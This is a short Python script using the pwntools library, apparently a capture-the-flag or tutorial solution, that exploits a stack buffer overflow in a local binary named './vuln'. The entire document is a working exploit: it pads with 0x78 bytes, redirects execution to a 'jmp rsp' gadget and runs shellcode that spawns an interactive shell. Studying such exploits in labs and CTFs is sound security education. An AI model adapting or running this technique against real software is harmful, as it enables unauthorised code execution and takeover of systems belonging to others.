from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

p.clean()
p.sendline(flat(
    b'x' * 0x78,
    jmp_rsp,
    asm(shellcraft.sh())
))
p.interactive()
